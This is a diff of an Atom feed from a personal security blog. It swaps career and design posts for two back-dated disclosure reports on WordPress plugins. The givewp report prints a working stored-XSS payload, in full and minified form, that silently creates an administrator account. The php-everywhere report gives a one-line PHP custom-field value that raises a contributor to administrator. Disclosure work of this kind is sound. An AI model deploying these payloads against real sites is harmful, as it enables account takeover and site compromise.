@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://ahermosilla.com/feed.xml" rel="self" type="application/atom+xml" /><link href="http://ahermosilla.com/" rel="alternate" type="text/html" /><updated>2025-05-16T19:46:12+00:00</updated><id>http://ahermosilla.com/feed.xml</id><title type="html">Andres Hermosilla | brain –archive</title><subtitle>Hi there, this is where I archive some of my brain records on development and design topics I've been working through. Some of these thoughts are raw as I'm evolving and others  are refined from years of experience.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://ahermosilla.com/feed.xml" rel="self" type="application/atom+xml" /><link href="http://ahermosilla.com/" rel="alternate" type="text/html" /><updated>2025-05-16T20:14:23+00:00</updated><id>http://ahermosilla.com/feed.xml</id><title type="html">Andres Hermosilla | brain –archive</title><subtitle>Hi there, this is where I archive some of my brain records on development and design topics I've been working through. Some of these thoughts are raw as I'm evolving and others  are refined from years of experience.
 </subtitle><entry><title type="html">Leveraging AWS signed requests for Identity Proof</title><link href="http://ahermosilla.com/cloud/2020/11/17/leveraging-aws-signed-requests.html" rel="alternate" type="text/html" title="Leveraging AWS signed requests for Identity Proof" /><published>2020-11-17T00:00:00+00:00</published><updated>2020-11-17T00:00:00+00:00</updated><id>http://ahermosilla.com/cloud/2020/11/17/leveraging-aws-signed-requests</id><content type="html" xml:base="http://ahermosilla.com/cloud/2020/11/17/leveraging-aws-signed-requests.html"><![CDATA[<p><img src="/assets/img/aws-sts-header.png" alt="RDP" /></p>
 
 <p>I was working on an internal API that I wanted to make available for other ops team members. The security team has their own AWS account and ops have their own AWS accounts as well as the various product teams business units. I wanted to, with little effort, enable teams to use my API which was built on AWS API Gateway + AWS Lambda. There is no need for granular authorization since the API is readonly so I configured the API Gateway to use API Keys. I wanted to have self-service API key generation, where the user could generate their own API key with their username as the key name.</p>
@@ -1220,237 +1220,103 @@ https://blog.rapid7.com/2018/10/16/how-to-conduct-dns-reconnaissance-for-02-usin
   <li>https://github.com/nccgroup/singularity</li>
   <li>https://github.com/taviso/rbndr</li>
   <li>https://research.nccgroup.com/2020/03/30/impact-of-dns-over-https-doh-on-dns-rebinding-attacks/</li>
-</ul>]]></content><author><name></name></author><category term="security" /><category term="ssrf" /><category term="dns" /><summary type="html"><![CDATA[Generally when I make http requests against a domain, I wouldn’t expect it to make requests on my localhost - but sometimes, just that happens. For getting sneaky with SSRF attacks you can have a DNS record point to 127.0.0.1. When a record pointing to 127.0.0.1 is resolved, your application will end up making requests 127.0.0.1. For experimentation, I used one of Rapid7’s free datasets, &amp; found the domain volks-seat.de pointing 127.0.0.1. It never occurred to me you could do such a thing so I did some digging ;) to see what I could learn.]]></summary></entry><entry><title type="html">Thinking about computer science?</title><link href="http://ahermosilla.com/learning/2017/07/29/thinking-about-com-sci.html" rel="alternate" type="text/html" title="Thinking about computer science?" /><published>2017-07-29T00:00:00+00:00</published><updated>2017-07-29T00:00:00+00:00</updated><id>http://ahermosilla.com/learning/2017/07/29/thinking-about-com-sci</id><content type="html" xml:base="http://ahermosilla.com/learning/2017/07/29/thinking-about-com-sci.html"><![CDATA[<p>My initial career plans were to get degree in Mechanical Engineering. Plans didn’t go as planned, and I wasn’t quite 
-mature enough to handle the level of rigor immediately outside of high school. My plans evolved into an art direction, 
-since I always enjoyed art &amp; I decided to ignore the $$$ (or there lack of) problem with art careers. From art, I realized 
-I needed to make some money so I honed in on Graphic Design, which actually described my art process anyways. I went to 
-community college, and then to Fresno State majored in GD and minored in Philosophy. My first job out of school was doing 
-front-end development. My background in design and small experience with coding HTML/CSS made me a good fit for the position 
-which consisted mostly of PSD to HMTL conversion. There I realized I could make the computer do repetitive tasks for me so 
-that I wouldn’t have to - welcome to programming! From that position I moved on to another marketing agency doing the same
- thing, but more advanced websites, also while doing design as well. From there I made the jump into full-time development as 
-a Software Engineer.</p>
+</ul>]]></content><author><name></name></author><category term="security" /><category term="ssrf" /><category term="dns" /><summary type="html"><![CDATA[Generally when I make http requests against a domain, I wouldn’t expect it to make requests on my localhost - but sometimes, just that happens. For getting sneaky with SSRF attacks you can have a DNS record point to 127.0.0.1. When a record pointing to 127.0.0.1 is resolved, your application will end up making requests 127.0.0.1. For experimentation, I used one of Rapid7’s free datasets, &amp; found the domain volks-seat.de pointing 127.0.0.1. It never occurred to me you could do such a thing so I did some digging ;) to see what I could learn.]]></summary></entry><entry><title type="html">Vulnerability Report - WordPress plugin - givewp</title><link href="http://ahermosilla.com/security/2017/11/27/vuln-givewp.html" rel="alternate" type="text/html" title="Vulnerability Report - WordPress plugin - givewp" /><published>2017-11-27T00:00:00+00:00</published><updated>2017-11-27T00:00:00+00:00</updated><id>http://ahermosilla.com/security/2017/11/27/vuln-givewp</id><content type="html" xml:base="http://ahermosilla.com/security/2017/11/27/vuln-givewp.html"><![CDATA[<p>This is a post I back dated to when I privately reported a vulnerability to givewp for their WordPress plugin. I privately shared via their support contact form. The version this XSS was found is long in the past!</p>
 
-<p>Before I give any advice suggestions regarding programming I will give you some general advice/questions to help you decide what to pursue.
-What activity did/do you most enjoy when you were younger?
-When I was a kid, I always enjoyed building things with Legos. For a long time I knew when I was older I wanted to build stuff. 
-Initially I thought that would be engineering, but I didn’t particularly enjoy the math and science (which changed after I ‘grew’ up) 
-when I was younger. I realized an important part of the building for me was the aesthetic, which led me down the graphic design path. 
-Recognizing what you enjoyed as a kid can help you identify careers that line up with who you are. That being said, be 
-pragmatic at the same time. I enjoyed art, but choose a focus that could pay bills vs eating paint.</p>
+<blockquote>
+  <p>I discovered an XSS vulnerability, details included in Vulnerability input.
+If you have any questions or need more information please let me know! I wasn’t sure how to do a ‘private pull request’ otherwise I would have done that.</p>
+</blockquote>
 
-<h3 id="what-sort-of-life-style-do-you-want-to-have">What sort of life-style do you want to have?</h3>
-<p>Initially, before I settled on graphic design &amp; then programming I decided I wanted a career that would give me flexibility and 
-wouldn’t require me to necessarily work every day or even at a specific location. I wanted something that I could easily work from home and/or 
-for myself. I didn’t care as much about money, I just wanted freedom - I just always assumed money was the avenue to freedom.
- Some people like to travel, some people like to be outdoors, some people like
- to never see another person during their job, some people like variety and some people don’t. Figuring out what kind of lifestyle you want to live 
-can help you eliminate a number of options and hone in on what make sense.</p>
+<h2 id="problem">Problem</h2>
+<p>There is an Authenticated, Stored XSS that allows lower privileges users to craft an XSS payload in the form title that would enable them to create an administrator user they can login with. For the proof of concept, I created a user with the <em>Give Worker</em> role and created an admin user via the XSS.</p>
 
-<h3 id="where-do-you-want-to-live">Where do you want to live?</h3>
-<p>I want to be where my family lives, which is currently Fresno area. STEM jobs in this area are typically ag-focused 
-but there are places I can work. Now if I wanted to study Marine Biology, I probably couldn’t live in Fresno and do that. 
-You need to consider what how the work you want to do lines up or doesn’t line up with where you you want to live</p>
+<h2 id="problem-source">Problem source</h2>
+<p>I can’t find the original version of the source code, but here is the reference.
+https://github.com/WordImpress/Give/blob/release/1.8.17/includes/admin/tools/logs/class-sales-logs-list-table.php#L75Raw</p>
 
-<h3 id="what-is-the-forecast-of-career">What is the forecast of career?</h3>
-<p>Will the field be relevant in 10 years? Does it pay enough to support a family? Will robots take over your job very soon?</p>
-
-<p><a href="http://www.npr.org/sections/money/2015/05/21/408234543/will-your-job-be-done-by-a-machine">http://www.npr.org/sections/money/2015/05/21/408234543/will-your-job-be-done-by-a-machine</a></p>
-
-<h3 id="avoid-college-debt">Avoid College Debt</h3>
-<p>College debt carries with you until you pay it off. You can’t declare bankruptcy and rid yourself of it.
- It really puts you at a disadvantage financially. For this reason I would suggest starting off 
-with community college and then go to a four year school. This is additionally helpful for students that are unsure – 
-it’s not worth wasting money on general-ed classes.</p>
-
-<p><a href="http://www.hamiltonproject.org/charts/undergraduate_student_loan_calculator">http://www.hamiltonproject.org/charts/undergraduate_student_loan_calculator</a></p>
-
-<h2 id="softwareprogramming">Software/Programming</h2>
-<h3 id="context">Context</h3>
-<p>My focus in the world of software is and will always be the web so my suggestions as far as technology goes will be web-slanted. 
-Many of the suggestions transcend the web platform but do keep that in mind.</p>
-
-<p>Computers are constantly evolving machines. They require you to also evolve to maintain relevance in the industry. If you enjoy learning and trying new things you will be fine. If you don’t enjoy constant evolution and change, you probably won’t be happy. Below are some good ingredients to success.</p>
-
+<h2 id="steps-to-reproduce">Steps to reproduce</h2>
 <ul>
-  <li>Adaptiveness</li>
-  <li>Not afraid of trial and error</li>
-  <li>Humility</li>
-  <li>Learning</li>
-  <li>Can-do-attitude</li>
-  <li>Efficiency</li>
+  <li>1 - Add user with Give Worker role</li>
+  <li>2 - Login to that user account or switch to that user using User Switching plugin</li>
+  <li>3 - Add donation form at Give &gt; Add Form (/wp-admin/post-new.php?post_type=give_forms)</li>
+  <li>4 - For form title use the minifiied title with script tags found here</li>
 </ul>
 
-<h3 id="learn-linux">Learn Linux</h3>
-<p>Linux is on servers, phones, cameras, cars … linux is everywhere! No matter what you decide to focus on software wise you will probably have to work with linux. In fact, good ol’ Microsft released .NET for linux and is transitioning Azure to linux? To learn install Ubuntu (easiest to start with) on a computer and learn the command line. You can also get an Amazon EC2 free instance! Most servers are linux and the number of jobs you can get just from being awesome at linux is quite substantial.</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">u5</span><span class="o">=</span><span class="dl">'</span><span class="s1">/wp-admin/user-new.php</span><span class="dl">'</span>
+<span class="nx">u8</span><span class="o">=</span> <span class="dl">"</span><span class="s2">same-origin</span><span class="dl">"</span>
+<span class="nf">fetch</span><span class="p">(</span><span class="nx">u5</span><span class="p">,{</span><span class="na">credentials</span><span class="p">:</span> <span class="nx">u8</span><span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">n</span><span class="o">=</span><span class="p">{}</span>
+  <span class="nx">fd</span><span class="o">=</span><span class="k">new</span> <span class="nc">FormData</span><span class="p">();</span>
+  <span class="c1">// Create an admin user via XSS</span>
+  <span class="nx">r</span><span class="p">.</span><span class="nf">text</span><span class="p">().</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">){</span>
+    <span class="nx">m</span> <span class="o">=</span> <span class="sr">/_wpnonce_create-user" value="</span><span class="se">([^</span><span class="sr">"</span><span class="se">]</span><span class="sr">*</span><span class="se">?)</span><span class="sr">"/</span><span class="p">.</span><span class="nf">exec</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
+    <span class="nx">n</span><span class="p">[</span><span class="dl">'</span><span class="s1">_wpnonce_create-user</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">m</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">action</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">createuser</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">pass1</span><span class="o">=</span><span class="dl">'</span><span class="s1">pass9999999999</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">pass2</span><span class="o">=</span><span class="dl">'</span><span class="s1">pass9999999999</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">user_login</span><span class="o">=</span><span class="dl">'</span><span class="s1">test4565465</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">email</span><span class="o">=</span><span class="dl">'</span><span class="s1">waiting@email.com</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">role</span><span class="o">=</span><span class="dl">'</span><span class="s1">administrator</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">_wp_http_referer</span><span class="o">=</span><span class="nx">u5</span><span class="p">;</span>
 
+    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">k</span> <span class="k">in</span> <span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">fd</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nx">k</span><span class="p">,</span> <span class="nx">n</span><span class="p">[</span><span class="nx">k</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="nf">fetch</span><span class="p">(</span><span class="nx">u5</span><span class="p">,</span> <span class="p">{</span>
+      <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">body</span><span class="p">:</span> <span class="nx">fd</span><span class="p">,</span>
+      <span class="na">credentials</span><span class="p">:</span><span class="nx">u8</span>
+    <span class="p">});</span>
+  <span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p><strong>minified version</strong></p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// &lt;script&gt;u5="/wp-admin/user-new.php",u8="same-origin",fetch(u5,{credentials:u8}).then(function(e){n={},fd=new FormData,e.text().then(function(e){m=/_wpnonce_create-user" value="([^"]*?)"/.exec(e),n["_wpnonce_create-user"]=m[1],n.action="createuser",n.pass1="pass9999999999",n.pass2="pass9999999999",n.user_login="test4565465",n.email="waiting@email.com",n.role="administrator",n._wp_http_referer=u5;for(var t in n)fd.append(t,n[t]);fetch(u5,{method:"post",body:fd,credentials:u8})})});&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>https://gist.github.com/rezen/df6d132e2336424e9b3668ed7c5947a5</p>
 <ul>
-  <li><a href="https://www.virtualbox.org/">Virtualbox</a> - Fire up a linux vm!</li>
-  <li><a href="http://overthewire.org/wargames/bandit/bandit0.html">http://overthewire.org/wargames/bandit/bandit0.html</a>  - use ssh to learn on a vm</li>
-  <li><a href="https://aws.amazon.com/ec2/pricing/">AWS EC2</a> - free tier!</li>
-  <li><a href="https://github.com/jlevy/the-art-of-command-line">CLI Tips &amp; Tricks</a> - lots of cli tips</li>
+  <li>5 - Switch to administrator user</li>
+  <li>6 - With an administrator account, go to Give &gt; Tools &gt; Logs (tab) (/wp-admin/edit.php?post_type=give_forms&amp;page=give-tools&amp;tab=logs)</li>
+  <li>7 - Go observe new user added Users &gt; All Users (/wp-admin/users.php)</li>
 </ul>
 
-<h3 id="learn-languages">Learn Languages</h3>
-<p>You should learn the language that fits into the industry that interests you - if you aren’t sure yet what you interests you, that’s ok. Below are some common language that are good to know and are pretty universal. Keep in mind this advice come from the web platform perspective.</p>
-
-<p>In regards to learning specifically, you can only learn if you do. Come up with a project, and create it in the language you want to learn. A simple project for learning a web stack for example is to make a twitter clone.</p>
-
-<p><strong>Charts on Trends</strong></p>
+<h2 id="tested-on">Tested on</h2>
 <ul>
-  <li><a href="http://www.tiobe.com/tiobe_index">Tiobe Index</a></li>
-  <li><a href="http://www.indeed.com/jobtrends/q-python-q-javascript-q-ruby-q-c++.html">Indeed Trends</a></li>
+  <li>WP Version: 4.8</li>
+  <li>PHP Version: 5.6.30</li>
+  <li>Plugin Version: 1.8.16</li>
+  <li>Browser: Chrome 58</li>
+</ul>]]></content><author><name></name></author><category term="security" /><category term="vulnerability" /><summary type="html"><![CDATA[This is a post I back dated to when I privately reported a vulnerability to givewp for their WordPress plugin. I privately shared via their support contact form. The version this XSS was found is long in the past!]]></summary></entry><entry><title type="html">Vulnerability Report - WordPress plugin - php-everywhere</title><link href="http://ahermosilla.com/security/2017/11/25/vuln-php-anywhere.html" rel="alternate" type="text/html" title="Vulnerability Report - WordPress plugin - php-everywhere" /><published>2017-11-25T00:00:00+00:00</published><updated>2017-11-25T00:00:00+00:00</updated><id>http://ahermosilla.com/security/2017/11/25/vuln-php-anywhere</id><content type="html" xml:base="http://ahermosilla.com/security/2017/11/25/vuln-php-anywhere.html"><![CDATA[<p>This is a post I back dated to when I privately reported a vulnerability to the author of the php-everywhere plugin. I discovered a low privileged user could execute arbitrary PHP code and provided a POC where a low priv user could upgrade their permissions to admin. (The plugin is no longer available for downloadhttps://wordpress.org/plugins/php-everywhere/)</p>
+
+<hr />
+
+<p><br /></p>
+<blockquote>
+  <p>Hi Alexander, I discovered a vulnerability in the PHP EveryWhere Plugin.</p>
+</blockquote>
+
+<h2 id="steps">Steps</h2>
+<ul>
+  <li>1 - In PHP EveryWhere plugin options, set user role management option to Administrator only</li>
+  <li>2 - Login as a contributor, or use User Switching plugin to switch to a contributor user.</li>
+  <li>3 - Observe user id via JavaScript <code class="language-plaintext highlighter-rouge">console.log(userSettings.uid)</code> or from the field on the source code on /wp-admin/profile.php. The user is able to find their user_id.</li>
+  <li>4 - As contributor, add new post, with whatever title they want &amp; with content of <code class="language-plaintext highlighter-rouge">[php_everywhere]</code>.
+    <ul>
+      <li>They add a custom field with name of php_everywhere_code and use example value from below, with their user_id (using 4 for examples sake)
+        <ul>
+          <li><code class="language-plaintext highlighter-rouge">&lt;?php wp_update_user(array('ID' =&gt; 4,'role'=&gt;'administrator'));?&gt;";</code></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>5 - Save draft, preview post</li>
+  <li>6 - Go to dashboard and observe, wallah, privileges upgraded to admin.</li>
 </ul>
 
-<h4 id="python">Python</h4>
-<p>Python is an easy language to get started with. It is supported on every platform and is easy to read. It does a good job of introducing you to programming concepts and to clean code. Almost every software company has python somewhere in their infrastructure – I can guarantee you, you can use it the rest of your career. There are so many resources</p>
+<p>An administrator would expect, which that setting that contributors/editors would not be able to execute php, but that is not the case. With example below a contributor is able to make themselves an admin and do whatever they please.</p>
 
-<ul>
-  <li><a href="http://learnpythonthehardway.org/">Python the Hard way</a></li>
-  <li><a href="https://www.codecademy.com/learn/python">Code Academy</a></li>
-</ul>
+<p>What should happen, is in the function <code class="language-plaintext highlighter-rouge">php_everywhere_data</code> you should check if the option was set to Administrator only, and if the current user was not an administrator, then you should not save. Additionally you need filter out the key php_everywhere_code in the meta set in the <code class="language-plaintext highlighter-rouge">$_POST</code>.</p>
 
-<h4 id="javascript">JavaScript</h4>
-<p>“Always bet on JavaScript” - It is the “Lingua franca” of the web. There are tons of resources everywhere and you don’t need
-anything other than a browser to get started on it. Personally I have spent the most time on JavaScript and really enjoy it
-but there are lots of gotchas compared to python that make it less intuitive.</p>
-
-<ul>
-  <li><a href="http://nodeschool.io/">NodeSchool</a></li>
-  <li><a href="http://bonsaiden.github.io/JavaScript-Garden/">JavaScript Garden</a></li>
-</ul>
-
-<h4 id="golang">Golang</h4>
-<p>Golang is a statically typed language that was designed with concurrency from the get-go. It’s a very fast and up and coming platform.</p>
-
-<ul>
-  <li><a href="https://gobyexample.com/">Go by Example</a></li>
-</ul>
-
-<h4 id="learn-a-database">Learn a Database</h4>
-<p>MySql, SQL Server, Postgres - it doesn’t matter, just know some SQL basics! Relational databases are going to be here forever
-and so familiarity with creating data structures and querying data is handy-dandy!</p>
-
-<h4 id="learn-version-control">Learn Version Control</h4>
-<p>Version control is a skill every professioanl developer must have! If you work on a team or even by yourself
-the organization you’ll be working at will have something.</p>
-
-<ul>
-  <li><a href="https://www.codeschool.com/courses/try-git">https://www.codeschool.com/courses/try-git</a></li>
-  <li><a href="https://www.git-tower.com/learn/ ">https://www.git-tower.com/learn/ </a></li>
-  <li><a href="https://www.atlassian.com/git/">https://www.atlassian.com/git/</a></li>
-  <li><a href="http://learngitbranching.js.org/ ">http://learngitbranching.js.org/ </a></li>
-</ul>
-
-<h4 id="resources-for-learning">Resources for learning</h4>
-<ul>
-  <li><a href="https://github.com/karlhorky/learn-to-program">https://github.com/karlhorky/learn-to-program</a></li>
-  <li><a href="http://exercism.io/">http://exercism.io/</a></li>
-  <li><a href="https://www.codecademy.com/">https://www.codecademy.com/</a></li>
-  <li><a href="http://tutsplus.com/">http://tutsplus.com/</a></li>
-  <li><a href="https://teamtreehouse.com/">https://teamtreehouse.com/</a></li>
-  <li><a href="https://www.codeschool.com/">https://www.codeschool.com/</a></li>
-  <li><a href="https://www.pluralsight.com/">https://www.pluralsight.com/</a></li>
-</ul>
-
-<h3 id="alternative-degrees">Alternative Degrees</h3>
-<p>Computer science degrees don’t guarantee success or jobs and are generally  at least 5+ years  behind current trends. The reality is your best education will be self motivated using many of the online resources available. I think generally getting a degree is a good idea, but it may serve you well to have a degree to complement your self-guided computer education.</p>
-
-<p><strong>Complementary</strong></p>
-<ul>
-  <li>Economics, Finance, Business, Statistics, Cognitive Science, Psychology, Linguistics, Mathematics, Graphic Design/Comm</li>
-</ul>
-
-<p><strong>Related</strong></p>
-<ul>
-  <li>Engineering, Information System</li>
-</ul>
-
-<p>There are tons of industries that have lots of oppurtunity if you have mixed disciplines. Many industries have barely started
-leveraging computers so many are ripe the evolution brought on by software. For example if you combo a medical education
-with a software education you will have unique opportunities that require expertise in both fields that others could never have.</p>
-
-<p><a href="https://www.quora.com/What-advice-would-you-give-to-a-Computer-Science-major-student-that-you-wish-you-were-given-when-you-started-Computer-Science">https://www.quora.com/What-advice-would-you-give-to-a-Computer-Science-major-student-that-you-wish-you-were-given-when-you-started-Computer-Science</a></p>]]></content><author><name></name></author><category term="learning" /><category term="raw" /><category term="ideas" /><summary type="html"><![CDATA[My initial career plans were to get degree in Mechanical Engineering. Plans didn’t go as planned, and I wasn’t quite mature enough to handle the level of rigor immediately outside of high school. My plans evolved into an art direction, since I always enjoyed art &amp; I decided to ignore the $$$ (or there lack of) problem with art careers. From art, I realized I needed to make some money so I honed in on Graphic Design, which actually described my art process anyways. I went to community college, and then to Fresno State majored in GD and minored in Philosophy. My first job out of school was doing front-end development. My background in design and small experience with coding HTML/CSS made me a good fit for the position which consisted mostly of PSD to HMTL conversion. There I realized I could make the computer do repetitive tasks for me so that I wouldn’t have to - welcome to programming! From that position I moved on to another marketing agency doing the same thing, but more advanced websites, also while doing design as well. From there I made the jump into full-time development as a Software Engineer. Before I give any advice suggestions regarding programming I will give you some general advice/questions to help you decide what to pursue. What activity did/do you most enjoy when you were younger? When I was a kid, I always enjoyed building things with Legos. For a long time I knew when I was older I wanted to build stuff. Initially I thought that would be engineering, but I didn’t particularly enjoy the math and science (which changed after I ‘grew’ up) when I was younger. I realized an important part of the building for me was the aesthetic, which led me down the graphic design path. Recognizing what you enjoyed as a kid can help you identify careers that line up with who you are. That being said, be pragmatic at the same time. I enjoyed art, but choose a focus that could pay bills vs eating paint. What sort of life-style do you want to have? Initially, before I settled on graphic design &amp; then programming I decided I wanted a career that would give me flexibility and wouldn’t require me to necessarily work every day or even at a specific location. I wanted something that I could easily work from home and/or for myself. I didn’t care as much about money, I just wanted freedom - I just always assumed money was the avenue to freedom. Some people like to travel, some people like to be outdoors, some people like to never see another person during their job, some people like variety and some people don’t. Figuring out what kind of lifestyle you want to live can help you eliminate a number of options and hone in on what make sense. Where do you want to live? I want to be where my family lives, which is currently Fresno area. STEM jobs in this area are typically ag-focused but there are places I can work. Now if I wanted to study Marine Biology, I probably couldn’t live in Fresno and do that. You need to consider what how the work you want to do lines up or doesn’t line up with where you you want to live What is the forecast of career? Will the field be relevant in 10 years? Does it pay enough to support a family? Will robots take over your job very soon? http://www.npr.org/sections/money/2015/05/21/408234543/will-your-job-be-done-by-a-machine Avoid College Debt College debt carries with you until you pay it off. You can’t declare bankruptcy and rid yourself of it. It really puts you at a disadvantage financially. For this reason I would suggest starting off with community college and then go to a four year school. This is additionally helpful for students that are unsure – it’s not worth wasting money on general-ed classes. http://www.hamiltonproject.org/charts/undergraduate_student_loan_calculator Software/Programming Context My focus in the world of software is and will always be the web so my suggestions as far as technology goes will be web-slanted. Many of the suggestions transcend the web platform but do keep that in mind. Computers are constantly evolving machines. They require you to also evolve to maintain relevance in the industry. If you enjoy learning and trying new things you will be fine. If you don’t enjoy constant evolution and change, you probably won’t be happy. Below are some good ingredients to success. Adaptiveness Not afraid of trial and error Humility Learning Can-do-attitude Efficiency Learn Linux Linux is on servers, phones, cameras, cars … linux is everywhere! No matter what you decide to focus on software wise you will probably have to work with linux. In fact, good ol’ Microsft released .NET for linux and is transitioning Azure to linux? To learn install Ubuntu (easiest to start with) on a computer and learn the command line. You can also get an Amazon EC2 free instance! Most servers are linux and the number of jobs you can get just from being awesome at linux is quite substantial. Virtualbox - Fire up a linux vm! http://overthewire.org/wargames/bandit/bandit0.html - use ssh to learn on a vm AWS EC2 - free tier! CLI Tips &amp; Tricks - lots of cli tips Learn Languages You should learn the language that fits into the industry that interests you - if you aren’t sure yet what you interests you, that’s ok. Below are some common language that are good to know and are pretty universal. Keep in mind this advice come from the web platform perspective. In regards to learning specifically, you can only learn if you do. Come up with a project, and create it in the language you want to learn. A simple project for learning a web stack for example is to make a twitter clone. Charts on Trends Tiobe Index Indeed Trends Python Python is an easy language to get started with. It is supported on every platform and is easy to read. It does a good job of introducing you to programming concepts and to clean code. Almost every software company has python somewhere in their infrastructure – I can guarantee you, you can use it the rest of your career. There are so many resources Python the Hard way Code Academy JavaScript “Always bet on JavaScript” - It is the “Lingua franca” of the web. There are tons of resources everywhere and you don’t need anything other than a browser to get started on it. Personally I have spent the most time on JavaScript and really enjoy it but there are lots of gotchas compared to python that make it less intuitive. NodeSchool JavaScript Garden Golang Golang is a statically typed language that was designed with concurrency from the get-go. It’s a very fast and up and coming platform. Go by Example Learn a Database MySql, SQL Server, Postgres - it doesn’t matter, just know some SQL basics! Relational databases are going to be here forever and so familiarity with creating data structures and querying data is handy-dandy! Learn Version Control Version control is a skill every professioanl developer must have! If you work on a team or even by yourself the organization you’ll be working at will have something. https://www.codeschool.com/courses/try-git https://www.git-tower.com/learn/ https://www.atlassian.com/git/ http://learngitbranching.js.org/ Resources for learning https://github.com/karlhorky/learn-to-program http://exercism.io/ https://www.codecademy.com/ http://tutsplus.com/ https://teamtreehouse.com/ https://www.codeschool.com/ https://www.pluralsight.com/ Alternative Degrees Computer science degrees don’t guarantee success or jobs and are generally at least 5+ years behind current trends. The reality is your best education will be self motivated using many of the online resources available. I think generally getting a degree is a good idea, but it may serve you well to have a degree to complement your self-guided computer education. Complementary Economics, Finance, Business, Statistics, Cognitive Science, Psychology, Linguistics, Mathematics, Graphic Design/Comm Related Engineering, Information System There are tons of industries that have lots of oppurtunity if you have mixed disciplines. Many industries have barely started leveraging computers so many are ripe the evolution brought on by software. For example if you combo a medical education with a software education you will have unique opportunities that require expertise in both fields that others could never have. https://www.quora.com/What-advice-would-you-give-to-a-Computer-Science-major-student-that-you-wish-you-were-given-when-you-started-Computer-Science]]></summary></entry><entry><title type="html">Design resources for developers</title><link href="http://ahermosilla.com/craftmanship/2017/07/29/design-for-devs.html" rel="alternate" type="text/html" title="Design resources for developers" /><published>2017-07-29T00:00:00+00:00</published><updated>2017-07-29T00:00:00+00:00</updated><id>http://ahermosilla.com/craftmanship/2017/07/29/design-for-devs</id><content type="html" xml:base="http://ahermosilla.com/craftmanship/2017/07/29/design-for-devs.html"><![CDATA[<p>As a developer, it is beneficial to understand basics of design
-and how people digest information. You may think to yourself that you will never
-have to create a visual interface, but the reality is even code
-has a visual aspect which has impact on its consumption. A deeper
-understanding of visual perception can positively impact your code!</p>
-
-<h4 id="principles">Principles</h4>
-<p>Design is a mature industry with centuries of application and study. There are many
-tried and true principles and concepts that you should apply and keep in mind when
-creating designs. Also understanding the elements of design and how they relate 
-together allows you to put the pieces together in a cohesive fashion</p>
-
-<ul>
-  <li>http://www.johnlovett.com/test.htm</li>
-  <li>http://visual.ly/6-principles-design</li>
-  <li>http://learndesignprinciples.com/</li>
-  <li>http://www.creativebloq.com/graphic-design/gestalt-theory-10134960</li>
-  <li>http://graphicdesign.spokanefalls.edu/tutorials/process/gestaltprinciples/gestaltprinc.htm</li>
-  <li>http://lifehacker.com/5739492/learn-the-basics-of-design-this-weekend</li>
-  <li>http://justcreative.com/2008/06/13/how-to-design-learn-the-basics/</li>
-</ul>
-
-<h4 id="typography">Typography</h4>
-<p>A vast amount of information that is communicated is in the form of text.
-The visual form of this text affects how the information presented is consumed.
-If letters are very too close together or too far apart, reading can be hindered. 
-If margin between lines of text is too big, discerning if information belongs together
-can become difficult. Typography is about addressing these sorts of problems with
-text and presenting text in a legible readable format.</p>
-<ul>
-  <li>http://tangledindesign.com/5-basic-principles-you-must-consider-to-master-the-art-of-typography/</li>
-  <li>https://www.smashingmagazine.com/2009/03/10-principles-for-readable-web-typography/</li>
-</ul>
-
-<h4 id="layouts">Layouts</h4>
-<p>TODO</p>
-
-<h2 id="links">Links</h2>
-<p>There are a number of resources to help developer types understand basics of design. 
-I’ve also included articles that cover the the concept of information hierarchy,
-which is very important tool for aiding the digestion of information.</p>
-
-<ul>
-  <li>https://blog.prototypr.io/design-for-programmers-d38c56982cd0</li>
-  <li>https://hackdesign.org/lessons</li>
-  <li>https://webdesign.tutsplus.com/articles/typography-basics-for-developers–webdesign-14025</li>
-  <li>http://www.slideshare.net/Wolfr/design-for-developersonlineversionlong/25-Examples_of_desirable_qualities_Fast</li>
-  <li>https://realm.io/news/christopher-downer-design-101-for-developers/</li>
-  <li>https://www.smashingmagazine.com/2015/02/design-principles-dominance-focal-points-hierarchy/</li>
-  <li>https://thoughtbot.com/upcase/design-for-developers</li>
-  <li>http://www.dadapixel.com/blog/2014/7/30/opinion-information-density-isnt-as-important-as-information-hierarchy</li>
-  <li>https://www.smashingmagazine.com/2014/03/design-principles-visual-perception-and-the-principles-of-gestalt/</li>
-  <li>http://ui-patterns.com/</li>
-  <li>http://uxmag.com/</li>
-  <li>http://52weeksofux.com</li>
-</ul>
-
-<h2 id="showcases">Showcases</h2>
